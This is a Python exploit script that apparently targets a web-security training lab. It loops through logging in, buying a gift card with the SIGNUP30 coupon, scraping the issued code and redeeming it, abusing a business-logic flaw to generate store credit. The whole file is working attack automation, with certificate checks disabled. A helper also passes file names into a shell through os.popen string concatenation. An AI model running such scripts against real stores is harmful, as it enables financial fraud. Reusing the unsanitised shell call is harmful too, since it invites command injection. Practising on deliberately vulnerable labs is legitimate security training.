# Script Source: https://gist.github.com/fbkch/0ad8907f4ad58680661c05007cb3c20b

# Script edited from https://gist.github.com/KrE80r/72a0ca623e0ff868672c795b244a6086

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
import sys
import os

# Comparison function to get the last gift card code
def compare(File1,File2):
    with open(File1,'r') as f:
        d=set(f.readlines())

    with open(File2,'r') as f:
        e=set(f.readlines())

    

    with open('file3.txt','w') as f:

         result = os.popen("diff " + File1 + " " + File2).read()
         f.write(result)




if len(sys.argv) != 2:
    print("USAGE: exploit.py <url>")
    sys.exit(1)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = sys.argv[1]



for i in range(0, 500):
    print("try {0}".format(i), end="\r", flush=True)
    r1 = requests.get(url + "login", proxies=proxies, verify=False)
    cookie_value = r1.cookies["session"]
    csrf = re.search('" value="(.*?)">', r1.text).group(1)

    headers = {"Cookie": "session=" + cookie_value}
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}

    r2 = requests.post(
        url + "login",
        data=data,
        headers=headers,
        proxies=proxies,
        verify=False,
        allow_redirects=False,
    )

    cookie_value = r2.cookies["session"]

    headers = {"Cookie": "session=" + cookie_value}
    data = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}

    r3 = requests.post(
        url + "cart",
        data=data,
        headers=headers,
        proxies=proxies,
        verify=False,
        allow_redirects=False,
    )

    r4 = requests.get(url + "cart", headers=headers, verify=False, proxies=proxies)
    csrf = re.search('" value="(.*?)">', r4.text).group(1)
    # print(csrf)

    data = {"csrf": csrf, "coupon": "SIGNUP30"}

    r5 = requests.post(
        url + "cart/coupon",
        headers=headers,
        data=data,
        proxies=proxies,
        verify=False,
        allow_redirects=False,
    )

    data = {"csrf": csrf}
    r6 = requests.post(
        url + "cart/checkout",
        headers=headers,
        data=data,
        proxies=proxies,
        verify=False,
        allow_redirects=False,
    )

    r7 = requests.get(
        url + "cart/order-confirmation?order-confirmed=true",
        headers=headers,
        proxies=proxies,
        verify=False,
    )

    if i==0:
        code = re.search(
            "<th>Code</th>\n                            </tr>\n                            <tr>\n                                <td>(.*?)</td>",
            r7.text,
        ).group(1)

        print("i: " + str(i) + " code: " + code)

        f = open("req.txt", "w")
        f.write(r7.text)
        f.close()

    else:
        f = open("req2.txt", "w")
        f.write(r7.text)
        f.close()

        compare("req.txt", "req2.txt")

        f = open("req.txt", "w")
        f.write(r7.text)
        f.close()

        #open text file in read mode
        text_file = open("file3.txt", "r")

        #read whole file to a string
        data = text_file.read()

        code = re.search(
            "<td>(.*?)</td>",
                data,
            ).group(1)

        #close file
        text_file.close()

        print("i: " + str(i) + " code: " + code)




    data = {"csrf": csrf, "gift-card": code}
    r8 = requests.post(
        url + "gift-card",
        headers=headers,
        data=data,
        proxies=proxies,
        verify=False,
        allow_redirects=False,
    )